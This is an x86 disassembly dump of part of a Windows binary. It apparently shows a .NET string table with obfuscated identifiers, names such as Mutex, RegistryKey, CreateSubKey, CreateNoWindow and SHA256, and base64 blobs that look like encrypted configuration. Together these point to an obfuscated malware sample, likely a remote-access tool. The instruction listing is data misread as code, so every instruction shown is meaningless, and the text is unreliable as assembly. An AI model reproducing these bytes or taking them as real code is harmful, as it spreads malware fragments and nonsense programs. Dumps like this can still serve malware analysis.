  4098cb:	55                   	push   %ebp
  4098cc:	45                   	inc    %ebp
  4098cd:	74 71                	je     0x409940
  4098cf:	6a 5a                	push   $0x5a
  4098d1:	57                   	push   %edi
  4098d2:	77 00                	ja     0x4098d4
  4098d4:	56                   	push   %esi
  4098d5:	65 4a                	gs dec %edx
  4098d7:	4c                   	dec    %esp
  4098d8:	4b                   	dec    %ebx
  4098d9:	53                   	push   %ebx
  4098da:	77 4a                	ja     0x409926
  4098dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4098dd:	71 63                	jno    0x409942
  4098df:	6d                   	insl   (%dx),%es:(%edi)
  4098e0:	46                   	inc    %esi
  4098e1:	41                   	inc    %ecx
  4098e2:	59                   	pop    %ecx
  4098e3:	77 00                	ja     0x4098e5
  4098e5:	6a 76                	push   $0x76
  4098e7:	4e                   	dec    %esi
  4098e8:	48                   	dec    %eax
  4098e9:	65 45                	gs inc %ebp
  4098eb:	56                   	push   %esi
  4098ec:	63 41 4e             	arpl   %eax,0x4e(%ecx)
  4098ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4098f0:	77 00                	ja     0x4098f2
  4098f2:	73 65                	jae    0x409959
  4098f4:	74 5f                	je     0x409955
  4098f6:	43                   	inc    %ebx
  4098f7:	72 65                	jb     0x40995e
  4098f9:	61                   	popa
  4098fa:	74 65                	je     0x409961
  4098fc:	4e                   	dec    %esi
  4098fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4098fe:	57                   	push   %edi
  4098ff:	69 6e 64 6f 77 00 4a 	imul   $0x4a00776f,0x64(%esi),%ebp
  409906:	4a                   	dec    %edx
  409907:	5a                   	pop    %edx
  409908:	74 66                	je     0x409970
  40990a:	64 45                	fs inc %ebp
  40990c:	68 77 54 72 77       	push   $0x77725477
  409911:	00 56 57             	add    %dl,0x57(%esi)
  409914:	5a                   	pop    %edx
  409915:	45                   	inc    %ebp
  409916:	74 67                	je     0x40997f
  409918:	6c                   	insb   (%dx),%es:(%edi)
  409919:	46                   	inc    %esi
  40991a:	63 4e 77             	arpl   %ecx,0x77(%esi)
  40991d:	77 00                	ja     0x40991f
  40991f:	7a 7a                	jp     0x40999b
  409921:	69 62 6c 43 7a 6e 69 	imul   $0x696e7a43,0x6c(%edx),%esp
  409928:	78 77                	js     0x4099a1
  40992a:	00 59 76             	add    %bl,0x76(%ecx)
  40992d:	46                   	inc    %esi
  40992e:	62 61 43             	bound  %esp,0x43(%ecx)
  409931:	47                   	inc    %edi
  409932:	79 4c                	jns    0x409980
  409934:	45                   	inc    %ebp
  409935:	6c                   	insb   (%dx),%es:(%edi)
  409936:	4e                   	dec    %esi
  409937:	49                   	dec    %ecx
  409938:	78 00                	js     0x40993a
  40993a:	5a                   	pop    %edx
  40993b:	75 73                	jne    0x4099b0
  40993d:	43                   	inc    %ebx
  40993e:	75 7a                	jne    0x4099ba
  409940:	66 53                	push   %bx
  409942:	6b 4a 78 00          	imul   $0x0,0x78(%edx),%ecx
  409946:	64 57                	fs push %edi
  409948:	50                   	push   %eax
  409949:	78 6e                	js     0x4099b9
  40994b:	64 4d                	fs dec %ebp
  40994d:	59                   	pop    %ecx
  40994e:	6e                   	outsb  %ds:(%esi),(%dx)
  40994f:	57                   	push   %edi
  409950:	4e                   	dec    %esi
  409951:	45                   	inc    %ebp
  409952:	4b                   	dec    %ebx
  409953:	78 00                	js     0x409955
  409955:	5a                   	pop    %edx
  409956:	4c                   	dec    %esp
  409957:	5a                   	pop    %edx
  409958:	5a                   	pop    %edx
  409959:	52                   	push   %edx
  40995a:	69 4c 69 78 59 53 51 	imul   $0x78515359,0x78(%ecx,%ebp,2),%ecx
  409961:	78 
  409962:	00 4d 75             	add    %cl,0x75(%ebp)
  409965:	74 65                	je     0x4099cc
  409967:	78 00                	js     0x409969
  409969:	63 58 6d             	arpl   %ebx,0x6d(%eax)
  40996c:	47                   	inc    %edi
  40996d:	6c                   	insb   (%dx),%es:(%edi)
  40996e:	49                   	dec    %ecx
  40996f:	6c                   	insb   (%dx),%es:(%edi)
  409970:	53                   	push   %ebx
  409971:	62 68 74             	bound  %ebp,0x74(%eax)
  409974:	67 78 00             	addr16 js 0x409977
  409977:	57                   	push   %edi
  409978:	61                   	popa
  409979:	46                   	inc    %esi
  40997a:	56                   	push   %esi
  40997b:	6a 6d                	push   $0x6d
  40997d:	43                   	inc    %ebx
  40997e:	42                   	inc    %edx
  40997f:	62 51 68             	bound  %edx,0x68(%ecx)
  409982:	6b 78 00 6c          	imul   $0x6c,0x0(%eax),%edi
  409986:	67 4d                	addr16 dec %ebp
  409988:	5a                   	pop    %edx
  409989:	73 49                	jae    0x4099d4
  40998b:	54                   	push   %esp
  40998c:	41                   	inc    %ecx
  40998d:	66 53                	push   %bx
  40998f:	70 78                	jo     0x409a09
  409991:	00 61 6f             	add    %ah,0x6f(%ecx)
  409994:	48                   	dec    %eax
  409995:	75 4f                	jne    0x4099e6
  409997:	77 55                	ja     0x4099ee
  409999:	71 59                	jno    0x4099f4
  40999b:	71 44                	jno    0x4099e1
  40999d:	6e                   	outsb  %ds:(%esi),(%dx)
  40999e:	43                   	inc    %ebx
  40999f:	79 00                	jns    0x4099a1
  4099a1:	73 73                	jae    0x409a16
  4099a3:	52                   	push   %edx
  4099a4:	71 4a                	jno    0x4099f0
  4099a6:	6c                   	insb   (%dx),%es:(%edi)
  4099a7:	52                   	push   %edx
  4099a8:	4c                   	dec    %esp
  4099a9:	51                   	push   %ecx
  4099aa:	79 00                	jns    0x4099ac
  4099ac:	4f                   	dec    %edi
  4099ad:	67 51                	addr16 push %ecx
  4099af:	76 77                	jbe    0x409a28
  4099b1:	58                   	pop    %eax
  4099b2:	61                   	popa
  4099b3:	76 4f                	jbe    0x409a04
  4099b5:	49                   	dec    %ecx
  4099b6:	53                   	push   %ebx
  4099b7:	79 00                	jns    0x4099b9
  4099b9:	75 4e                	jne    0x409a09
  4099bb:	4a                   	dec    %edx
  4099bc:	66 6c                	data16 insb (%dx),%es:(%edi)
  4099be:	4d                   	dec    %ebp
  4099bf:	4c                   	dec    %esp
  4099c0:	4b                   	dec    %ebx
  4099c1:	42                   	inc    %edx
  4099c2:	74 59                	je     0x409a1d
  4099c4:	79 00                	jns    0x4099c6
  4099c6:	49                   	dec    %ecx
  4099c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4099c8:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  4099cf:	65 
  4099d0:	41                   	inc    %ecx
  4099d1:	72 72                	jb     0x409a45
  4099d3:	61                   	popa
  4099d4:	79 00                	jns    0x4099d6
  4099d6:	54                   	push   %esp
  4099d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4099d8:	41                   	inc    %ecx
  4099d9:	72 72                	jb     0x409a4d
  4099db:	61                   	popa
  4099dc:	79 00                	jns    0x4099de
  4099de:	67 65 74 5f          	addr16 gs je 0x409a41
  4099e2:	41                   	inc    %ecx
  4099e3:	73 41                	jae    0x409a26
  4099e5:	72 72                	jb     0x409a59
  4099e7:	61                   	popa
  4099e8:	79 00                	jns    0x4099ea
  4099ea:	67 65 74 5f          	addr16 gs je 0x409a4d
  4099ee:	4b                   	dec    %ebx
  4099ef:	65 79 00             	gs jns 0x4099f2
  4099f2:	73 65                	jae    0x409a59
  4099f4:	74 5f                	je     0x409a55
  4099f6:	4b                   	dec    %ebx
  4099f7:	65 79 00             	gs jns 0x4099fa
  4099fa:	43                   	inc    %ebx
  4099fb:	72 65                	jb     0x409a62
  4099fd:	61                   	popa
  4099fe:	74 65                	je     0x409a65
  409a00:	53                   	push   %ebx
  409a01:	75 62                	jne    0x409a65
  409a03:	4b                   	dec    %ebx
  409a04:	65 79 00             	gs jns 0x409a07
  409a07:	4f                   	dec    %edi
  409a08:	70 65                	jo     0x409a6f
  409a0a:	6e                   	outsb  %ds:(%esi),(%dx)
  409a0b:	53                   	push   %ebx
  409a0c:	75 62                	jne    0x409a70
  409a0e:	4b                   	dec    %ebx
  409a0f:	65 79 00             	gs jns 0x409a12
  409a12:	67 65 74 5f          	addr16 gs je 0x409a75
  409a16:	50                   	push   %eax
  409a17:	75 62                	jne    0x409a7b
  409a19:	6c                   	insb   (%dx),%es:(%edi)
  409a1a:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409a21:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409a28:	4b 65 
  409a2a:	79 00                	jns    0x409a2c
  409a2c:	53                   	push   %ebx
  409a2d:	79 73                	jns    0x409aa2
  409a2f:	74 65                	je     0x409a96
  409a31:	6d                   	insl   (%dx),%es:(%edi)
  409a32:	2e 53                	cs push %ebx
  409a34:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409a38:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409a3f:	70 
  409a40:	74 6f                	je     0x409ab1
  409a42:	67 72 61             	addr16 jb 0x409aa6
  409a45:	70 68                	jo     0x409aaf
  409a47:	79 00                	jns    0x409a49
  409a49:	4f                   	dec    %edi
  409a4a:	59                   	pop    %ecx
  409a4b:	54                   	push   %esp
  409a4c:	75 65                	jne    0x409ab3
  409a4e:	67 6f                	outsl  %ds:(%si),(%dx)
  409a50:	55                   	push   %ebp
  409a51:	61                   	popa
  409a52:	72 6a                	jb     0x409abe
  409a54:	79 00                	jns    0x409a56
  409a56:	41                   	inc    %ecx
  409a57:	73 73                	jae    0x409acc
  409a59:	65 6d                	gs insl (%dx),%es:(%edi)
  409a5b:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409a5f:	41                   	inc    %ecx
  409a60:	64 64 72 65          	fs fs jb 0x409ac9
  409a64:	73 73                	jae    0x409ad9
  409a66:	46                   	inc    %esi
  409a67:	61                   	popa
  409a68:	6d                   	insl   (%dx),%es:(%edi)
  409a69:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409a70:	63 
  409a71:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409a75:	79 00                	jns    0x409a77
  409a77:	54                   	push   %esp
  409a78:	6f                   	outsl  %ds:(%esi),(%dx)
  409a79:	42                   	inc    %edx
  409a7a:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409a81:	65 74 5f             	gs je  0x409ae3
  409a84:	53                   	push   %ebx
  409a85:	79 73                	jns    0x409afa
  409a87:	74 65                	je     0x409aee
  409a89:	6d                   	insl   (%dx),%es:(%edi)
  409a8a:	44                   	inc    %esp
  409a8b:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409a92:	79 00                	jns    0x409a94
  409a94:	52                   	push   %edx
  409a95:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409a9c:	00 6f 
  409a9e:	70 5f                	jo     0x409aff
  409aa0:	45                   	inc    %ebp
  409aa1:	71 75                	jno    0x409b18
  409aa3:	61                   	popa
  409aa4:	6c                   	insb   (%dx),%es:(%edi)
  409aa5:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409aac:	49 
  409aad:	6e                   	outsb  %ds:(%esi),(%dx)
  409aae:	65 71 75             	gs jno 0x409b26
  409ab1:	61                   	popa
  409ab2:	6c                   	insb   (%dx),%es:(%edi)
  409ab3:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409aba:	74 
  409abb:	65 6d                	gs insl (%dx),%es:(%edi)
  409abd:	2e 4e                	cs dec %esi
  409abf:	65 74 2e             	gs je  0x409af0
  409ac2:	53                   	push   %ebx
  409ac3:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409ac7:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409ace:	64 
  409acf:	6f                   	outsl  %ds:(%esi),(%dx)
  409ad0:	77 73                	ja     0x409b45
  409ad2:	49                   	dec    %ecx
  409ad3:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409ad6:	74 69                	je     0x409b41
  409ad8:	74 79                	je     0x409b53
  409ada:	00 49 73             	add    %cl,0x73(%ecx)
  409add:	4e                   	dec    %esi
  409ade:	75 6c                	jne    0x409b4c
  409ae0:	6c                   	insb   (%dx),%es:(%edi)
  409ae1:	4f                   	dec    %edi
  409ae2:	72 45                	jb     0x409b29
  409ae4:	6d                   	insl   (%dx),%es:(%edi)
  409ae5:	70 74                	jo     0x409b5b
  409ae7:	79 00                	jns    0x409ae9
  409ae9:	6d                   	insl   (%dx),%es:(%edi)
  409aea:	72 64                	jb     0x409b50
  409aec:	6a 72                	push   $0x72
  409aee:	74 4b                	je     0x409b3b
  409af0:	58                   	pop    %eax
  409af1:	67 4e                	addr16 dec %esi
  409af3:	77 43                	ja     0x409b38
  409af5:	57                   	push   %edi
  409af6:	7a 00                	jp     0x409af8
  409af8:	50                   	push   %eax
  409af9:	46                   	inc    %esi
  409afa:	6c                   	insb   (%dx),%es:(%edi)
  409afb:	46                   	inc    %esi
  409afc:	56                   	push   %esi
  409afd:	6e                   	outsb  %ds:(%esi),(%dx)
  409afe:	45                   	inc    %ebp
  409aff:	41                   	inc    %ecx
  409b00:	65 5a                	gs pop %edx
  409b02:	70 4e                	jo     0x409b52
  409b04:	4d                   	dec    %ebp
  409b05:	62 7a 00             	bound  %edi,0x0(%edx)
  409b08:	69 6c 43 64 56 68 52 	imul   $0x75526856,0x64(%ebx,%eax,2),%ebp
  409b0f:	75 
  409b10:	74 73                	je     0x409b85
  409b12:	4d                   	dec    %ebp
  409b13:	57                   	push   %edi
  409b14:	6b 7a 00 73          	imul   $0x73,0x0(%edx),%edi
  409b18:	65 69 4a 5a 64 4a 59 	imul   $0x56594a64,%gs:0x5a(%edx),%ecx
  409b1f:	56 
  409b20:	62 61 70             	bound  %esp,0x70(%ecx)
  409b23:	7a 00                	jp     0x409b25
  409b25:	73 73                	jae    0x409b9a
  409b27:	4a                   	dec    %edx
  409b28:	76 58                	jbe    0x409b82
  409b2a:	77 63                	ja     0x409b8f
  409b2c:	67 58                	addr16 pop %eax
  409b2e:	64 74 7a             	fs je  0x409bab
  409b31:	00 00                	add    %al,(%eax)
  409b33:	00 00                	add    %al,(%eax)
  409b35:	0d 53 00 48 00       	or     $0x480053,%eax
  409b3a:	41                   	inc    %ecx
  409b3b:	00 32                	add    %dh,(%edx)
  409b3d:	00 35 00 36 00 00    	add    %dh,0x3600
  409b43:	80 d9 49             	sbb    $0x49,%cl
  409b46:	00 63 00             	add    %ah,0x0(%ebx)
  409b49:	33 00                	xor    (%eax),%eax
  409b4b:	41                   	inc    %ecx
  409b4c:	00 41 00             	add    %al,0x0(%ecx)
  409b4f:	65 00 33             	add    %dh,%gs:(%ebx)
  409b52:	00 6a 00             	add    %ch,0x0(%edx)
  409b55:	43                   	inc    %ebx
  409b56:	00 37                	add    %dh,(%edi)
  409b58:	00 30                	add    %dh,(%eax)
  409b5a:	00 68 00             	add    %ch,0x0(%eax)
  409b5d:	38 00                	cmp    %al,(%eax)
  409b5f:	78 00                	js     0x409b61
  409b61:	42                   	inc    %edx
  409b62:	00 38                	add    %bh,(%eax)
  409b64:	00 69 00             	add    %ch,0x0(%ecx)
  409b67:	4d                   	dec    %ebp
  409b68:	00 62 00             	add    %ah,0x0(%edx)
  409b6b:	64 00 54 00 63       	add    %dl,%fs:0x63(%eax,%eax,1)
  409b70:	00 50 00             	add    %dl,0x0(%eax)
  409b73:	4b                   	dec    %ebx
  409b74:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  409b78:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  409b7c:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  409b80:	00 31                	add    %dh,(%ecx)
  409b82:	00 67 00             	add    %ah,0x0(%edi)
  409b85:	4d                   	dec    %ebp
  409b86:	00 57 00             	add    %dl,0x0(%edi)
  409b89:	4c                   	dec    %esp
  409b8a:	00 30                	add    %dh,(%eax)
  409b8c:	00 4e 00             	add    %cl,0x0(%esi)
  409b8f:	4c                   	dec    %esp
  409b90:	00 46 00             	add    %al,0x0(%esi)
  409b93:	52                   	push   %edx
  409b94:	00 6b 00             	add    %ch,0x0(%ebx)
  409b97:	37                   	aaa
  409b98:	00 52 00             	add    %dl,0x0(%edx)
  409b9b:	77 00                	ja     0x409b9d
  409b9d:	7a 00                	jp     0x409b9f
  409b9f:	39 00                	cmp    %eax,(%eax)
  409ba1:	4f                   	dec    %edi
  409ba2:	00 49 00             	add    %cl,0x0(%ecx)
  409ba5:	31 00                	xor    %eax,(%eax)
  409ba7:	4b                   	dec    %ebx
  409ba8:	00 5a 00             	add    %bl,0x0(%edx)
  409bab:	77 00                	ja     0x409bad
  409bad:	34 00                	xor    $0x0,%al
  409baf:	6f                   	outsl  %ds:(%esi),(%dx)
  409bb0:	00 66 00             	add    %ah,0x0(%esi)
  409bb3:	79 00                	jns    0x409bb5
  409bb5:	6d                   	insl   (%dx),%es:(%edi)
  409bb6:	00 47 00             	add    %al,0x0(%edi)
  409bb9:	73 00                	jae    0x409bbb
  409bbb:	6d                   	insl   (%dx),%es:(%edi)
  409bbc:	00 57 00             	add    %dl,0x0(%edi)
  409bbf:	4b                   	dec    %ebx
  409bc0:	00 71 00             	add    %dh,0x0(%ecx)
  409bc3:	4e                   	dec    %esi
  409bc4:	00 73 00             	add    %dh,0x0(%ebx)
  409bc7:	44                   	inc    %esp
  409bc8:	00 32                	add    %dh,(%edx)
  409bca:	00 62 00             	add    %ah,0x0(%edx)
  409bcd:	56                   	push   %esi
  409bce:	00 33                	add    %dh,(%ebx)
  409bd0:	00 77 00             	add    %dh,0x0(%edi)
  409bd3:	44                   	inc    %esp
  409bd4:	00 56 00             	add    %dl,0x0(%esi)
  409bd7:	68 00 66 00 31       	push   $0x31006600
  409bdc:	00 71 00             	add    %dh,0x0(%ecx)
  409bdf:	46                   	inc    %esi
  409be0:	00 38                	add    %bh,(%eax)
  409be2:	00 36                	add    %dh,(%esi)
  409be4:	00 57 00             	add    %dl,0x0(%edi)
  409be7:	34 00                	xor    $0x0,%al
  409be9:	39 00                	cmp    %eax,(%eax)
  409beb:	71 00                	jno    0x409bed
  409bed:	5a                   	pop    %edx
  409bee:	00 34 00             	add    %dh,(%eax,%eax,1)
  409bf1:	38 00                	cmp    %al,(%eax)
  409bf3:	74 00                	je     0x409bf5
  409bf5:	74 00                	je     0x409bf7
  409bf7:	34 00                	xor    $0x0,%al
  409bf9:	31 00                	xor    %eax,(%eax)
  409bfb:	42                   	inc    %edx
  409bfc:	00 48 00             	add    %cl,0x0(%eax)
  409bff:	67 00 77 00          	add    %dh,0x0(%bx)
  409c03:	6f                   	outsl  %ds:(%esi),(%dx)
  409c04:	00 59 00             	add    %bl,0x0(%ecx)
  409c07:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  409c0b:	63 00                	arpl   %eax,(%eax)
  409c0d:	6c                   	insb   (%dx),%es:(%edi)
  409c0e:	00 63 00             	add    %ah,0x0(%ebx)
  409c11:	4f                   	dec    %edi
  409c12:	00 45 00             	add    %al,0x0(%ebp)
  409c15:	31 00                	xor    %eax,(%eax)
  409c17:	68 00 6f 00 3d       	push   $0x3d006f00
  409c1c:	00 00                	add    %al,(%eax)
  409c1e:	81 31 44 00 4f 00    	xorl   $0x4f0044,(%ecx)
  409c24:	51                   	push   %ecx
  409c25:	00 53 00             	add    %dl,0x0(%ebx)
  409c28:	6b 00 79             	imul   $0x79,(%eax),%eax
  409c2b:	00 57 00             	add    %dl,0x0(%edi)
  409c2e:	6c                   	insb   (%dx),%es:(%edi)
  409c2f:	00 2b                	add    %ch,(%ebx)
  409c31:	00 68 00             	add    %ch,0x0(%eax)
  409c34:	6c                   	insb   (%dx),%es:(%edi)
  409c35:	00 56 00             	add    %dl,0x0(%esi)
  409c38:	59                   	pop    %ecx
  409c39:	00 31                	add    %dh,(%ecx)
  409c3b:	00 4f 00             	add    %cl,0x0(%edi)
  409c3e:	69 00 65 00 38 00    	imul   $0x380065,(%eax),%eax
  409c44:	62 00                	bound  %eax,(%eax)
  409c46:	44                   	inc    %esp
  409c47:	00 41 00             	add    %al,0x0(%ecx)
  409c4a:	71 00                	jno    0x409c4c
  409c4c:	70 00                	jo     0x409c4e
  409c4e:	6c                   	insb   (%dx),%es:(%edi)
  409c4f:	00 51 00             	add    %dl,0x0(%ecx)
  409c52:	53                   	push   %ebx
  409c53:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  409c57:	00 49 00             	add    %cl,0x0(%ecx)
  409c5a:	4a                   	dec    %edx
  409c5b:	00 53 00             	add    %dl,0x0(%ebx)
  409c5e:	2f                   	das
  409c5f:	00 68 00             	add    %ch,0x0(%eax)
  409c62:	57                   	push   %edi
  409c63:	00 79 00             	add    %bh,0x0(%ecx)
  409c66:	79 00                	jns    0x409c68
  409c68:	78 00                	js     0x409c6a
  409c6a:	39 00                	cmp    %eax,(%eax)
  409c6c:	44                   	inc    %esp
  409c6d:	00 46 00             	add    %al,0x0(%esi)
  409c70:	7a 00                	jp     0x409c72
  409c72:	66 00 44 00 37       	data16 add %al,0x37(%eax,%eax,1)
  409c77:	00 6b 00             	add    %ch,0x0(%ebx)
  409c7a:	57                   	push   %edi
  409c7b:	00 66 00             	add    %ah,0x0(%esi)
  409c7e:	6a 00                	push   $0x0
  409c80:	72 00                	jb     0x409c82
  409c82:	52                   	push   %edx
  409c83:	00 59 00             	add    %bl,0x0(%ecx)
  409c86:	43                   	inc    %ebx
  409c87:	00 69 00             	add    %ch,0x0(%ecx)
  409c8a:	6f                   	outsl  %ds:(%esi),(%dx)
  409c8b:	00 49 00             	add    %cl,0x0(%ecx)
  409c8e:	31 00                	xor    %eax,(%eax)
  409c90:	41                   	inc    %ecx
  409c91:	00 48 00             	add    %cl,0x0(%eax)
  409c94:	38 00                	cmp    %al,(%eax)
  409c96:	54                   	push   %esp
  409c97:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  409c9b:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  409c9f:	00 56 00             	add    %dl,0x0(%esi)
  409ca2:	4c                   	dec    %esp
  409ca3:	00 41 00             	add    %al,0x0(%ecx)
  409ca6:	36 00 35 00 58 00 33 	add    %dh,%ss:0x33005800
  409cad:	00 70 00             	add    %dh,0x0(%eax)
  409cb0:	59                   	pop    %ecx
  409cb1:	00 58 00             	add    %bl,0x0(%eax)
  409cb4:	6e                   	outsb  %ds:(%esi),(%dx)
  409cb5:	00 4f 00             	add    %cl,0x0(%edi)
  409cb8:	43                   	inc    %ebx
  409cb9:	00 4f 00             	add    %cl,0x0(%edi)
  409cbc:	41                   	inc    %ecx
  409cbd:	00 69 00             	add    %ch,0x0(%ecx)
  409cc0:	38 00                	cmp    %al,(%eax)
  409cc2:	53                   	push   %ebx
  409cc3:	00 76 00             	add    %dh,0x0(%esi)
  409cc6:	4b                   	dec    %ebx
  409cc7:	00 35 00 6c 00 73    	add    %dh,0x73006c00
  409ccd:	00 48 00             	add    %cl,0x0(%eax)
  409cd0:	42                   	inc    %edx
  409cd1:	00 7a 00             	add    %bh,0x0(%edx)
  409cd4:	76 00                	jbe    0x409cd6
  409cd6:	4b                   	dec    %ebx
  409cd7:	00 42 00             	add    %al,0x0(%edx)
  409cda:	30 00                	xor    %al,(%eax)
  409cdc:	48                   	dec    %eax
  409cdd:	00 34 00             	add    %dh,(%eax,%eax,1)
  409ce0:	4e                   	dec    %esi
  409ce1:	00 65 00             	add    %ah,0x0(%ebp)
  409ce4:	4c                   	dec    %esp
  409ce5:	00 41 00             	add    %al,0x0(%ecx)
  409ce8:	42                   	inc    %edx
  409ce9:	00 6e 00             	add    %ch,0x0(%esi)
  409cec:	2f                   	das
  409ced:	00 31                	add    %dh,(%ecx)
  409cef:	00 61 00             	add    %ah,0x0(%ecx)
  409cf2:	6e                   	outsb  %ds:(%esi),(%dx)
  409cf3:	00 37                	add    %dh,(%edi)
  409cf5:	00 53 00             	add    %dl,0x0(%ebx)
  409cf8:	74 00                	je     0x409cfa
  409cfa:	4a                   	dec    %edx
  409cfb:	00 6d 00             	add    %ch,0x0(%ebp)
  409cfe:	78 00                	js     0x409d00
  409d00:	50                   	push   %eax
  409d01:	00 77 00             	add    %dh,0x0(%edi)
  409d04:	6a 00                	push   $0x0
  409d06:	57                   	push   %edi
  409d07:	00 64 00 68          	add    %ah,0x68(%eax,%eax,1)
  409d0b:	00 49 00             	add    %cl,0x0(%ecx)
  409d0e:	2b 00                	sub    (%eax),%eax
  409d10:	62 00                	bound  %eax,(%eax)
  409d12:	49                   	dec    %ecx
  409d13:	00 42 00             	add    %al,0x0(%edx)
  409d16:	4b                   	dec    %ebx
  409d17:	00 54 00 30          	add    %dl,0x30(%eax,%eax,1)
  409d1b:	00 4d 00             	add    %cl,0x0(%ebp)
  409d1e:	30 00                	xor    %al,(%eax)
  409d20:	73 00                	jae    0x409d22
  409d22:	4f                   	dec    %edi
  409d23:	00 4f 00             	add    %cl,0x0(%edi)
  409d26:	6e                   	outsb  %ds:(%esi),(%dx)
  409d27:	00 77 00             	add    %dh,0x0(%edi)
  409d2a:	47                   	inc    %edi
  409d2b:	00 6f 00             	add    %ch,0x0(%edi)
  409d2e:	73 00                	jae    0x409d30
  409d30:	2b 00                	sub    (%eax),%eax
  409d32:	69 00 49 00 53 00    	imul   $0x530049,(%eax),%eax
  409d38:	5a                   	pop    %edx
  409d39:	00 41 00             	add    %al,0x0(%ecx)
  409d3c:	77 00                	ja     0x409d3e
  409d3e:	4f                   	dec    %edi
  409d3f:	00 37                	add    %dh,(%edi)
  409d41:	00 50 00             	add    %dl,0x0(%eax)
  409d44:	39 00                	cmp    %eax,(%eax)
  409d46:	57                   	push   %edi
  409d47:	00 78 00             	add    %bh,0x0(%eax)
  409d4a:	41                   	inc    %ecx
  409d4b:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  409d51:	80 b1 46 00 67 00 76 	xorb   $0x76,0x670046(%ecx)
  409d58:	00 36                	add    %dh,(%esi)
  409d5a:	00 4f 00             	add    %cl,0x0(%edi)
  409d5d:	43                   	inc    %ebx
  409d5e:	00 68 00             	add    %ch,0x0(%eax)
  409d61:	2f                   	das
  409d62:	00 33                	add    %dh,(%ebx)
  409d64:	00 4a 00             	add    %cl,0x0(%edx)
  409d67:	37                   	aaa
  409d68:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  409d6c:	00 39                	add    %bh,(%ecx)
  409d6e:	00 6d 00             	add    %ch,0x0(%ebp)
  409d71:	72 00                	jb     0x409d73
  409d73:	39 00                	cmp    %eax,(%eax)
  409d75:	4e                   	dec    %esi
  409d76:	00 6d 00             	add    %ch,0x0(%ebp)
  409d79:	48                   	dec    %eax
  409d7a:	00 56 00             	add    %dl,0x0(%esi)
  409d7d:	6e                   	outsb  %ds:(%esi),(%dx)
  409d7e:	00 63 00             	add    %ah,0x0(%ebx)
  409d81:	51                   	push   %ecx
  409d82:	00 42 00             	add    %al,0x0(%edx)
  409d85:	59                   	pop    %ecx
  409d86:	00 31                	add    %dh,(%ecx)
  409d88:	00 55 00             	add    %dl,0x0(%ebp)
  409d8b:	75 00                	jne    0x409d8d
  409d8d:	7a 00                	jp     0x409d8f
  409d8f:	4c                   	dec    %esp
  409d90:	00 6e 00             	add    %ch,0x0(%esi)
  409d93:	4e                   	dec    %esi
  409d94:	00 32                	add    %dh,(%edx)
  409d96:	00 72 00             	add    %dh,0x0(%edx)
  409d99:	4d                   	dec    %ebp
  409d9a:	00 6f 00             	add    %ch,0x0(%edi)
  409d9d:	54                   	push   %esp
  409d9e:	00 36                	add    %dh,(%esi)
  409da0:	00 73 00             	add    %dh,0x0(%ebx)
  409da3:	4c                   	dec    %esp
  409da4:	00 70 00             	add    %dh,0x0(%eax)
  409da7:	48                   	dec    %eax
  409da8:	00 6a 00             	add    %ch,0x0(%edx)
  409dab:	47                   	inc    %edi
  409dac:	00 4f 00             	add    %cl,0x0(%edi)
  409daf:	72 00                	jb     0x409db1
  409db1:	66 00 38             	data16 add %bh,(%eax)
  409db4:	00 68 00             	add    %ch,0x0(%eax)
  409db7:	51                   	push   %ecx
  409db8:	00 50 00             	add    %dl,0x0(%eax)
  409dbb:	71 00                	jno    0x409dbd
  409dbd:	7a 00                	jp     0x409dbf
  409dbf:	44                   	inc    %esp
  409dc0:	00 59 00             	add    %bl,0x0(%ecx)
  409dc3:	35 00 33 00 56       	xor    $0x56003300,%eax
  409dc8:	00 56 00             	add    %dl,0x0(%esi)
  409dcb:	4d                   	dec    %ebp
  409dcc:	00 6d 00             	add    %ch,0x0(%ebp)
  409dcf:	6b 00 77             	imul   $0x77,(%eax),%eax
  409dd2:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  409dd6:	00 65 00             	add    %ah,0x0(%ebp)
  409dd9:	6e                   	outsb  %ds:(%esi),(%dx)
  409dda:	00 70 00             	add    %dh,0x0(%eax)
  409ddd:	58                   	pop    %eax
  409dde:	00 6f 00             	add    %ch,0x0(%edi)
  409de1:	78 00                	js     0x409de3
  409de3:	61                   	popa
  409de4:	00 36                	add    %dh,(%esi)
  409de6:	00 4e 00             	add    %cl,0x0(%esi)
  409de9:	79 00                	jns    0x409deb
  409deb:	52                   	push   %edx
  409dec:	00 78 00             	add    %bh,0x0(%eax)
  409def:	72 00                	jb     0x409df1
  409df1:	31 00                	xor    %eax,(%eax)
  409df3:	38 00                	cmp    %al,(%eax)
  409df5:	69 00 36 00 35 00    	imul   $0x350036,(%eax),%eax
